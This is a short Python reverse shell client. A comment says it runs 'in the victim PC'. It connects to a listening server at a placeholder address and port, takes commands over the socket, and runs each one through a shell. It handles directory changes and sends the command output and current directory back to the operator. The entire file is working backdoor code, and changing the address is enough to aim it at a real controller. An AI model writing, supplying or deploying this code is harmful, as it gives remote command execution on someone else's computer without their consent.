# This script run in the victim PC
import socket
import os
import subprocess

# Set the IP and the port of the listening server
target_host = "127.0.0.1"
target_port = 555

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket created")
client.connect((target_host, target_port))
print("Connection established")
# We receive the command in data object decode it to string and check if it is equal to “cd”, We do this to check cd command executed correctly because cd command doesn’t have an output to send us back. To change directory we use os.chdir.
# For the other commands we directly open a process and give the decoded string, SHELL should be FALSE if you don’t want a shell to open on client’s machine, we are piping out the stdout, stderr and stdin. We read the piped bytes into output_bytes, convert it to string and send it across the connection along with current working directory(cwd) using client.send(). we close the connection when while loop breaks.
while True:
    data = client.recv(1024).decode("utf-8")
    if data[:2] == 'cd':
        os.chdir(data[3:])
    if len(data) > 0:
        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read()
        output_str = str(output_bytes, "ISO-8859-1")
        client.send(str.encode(output_str + str(os.getcwd()) + '$'))
        # print(output_str)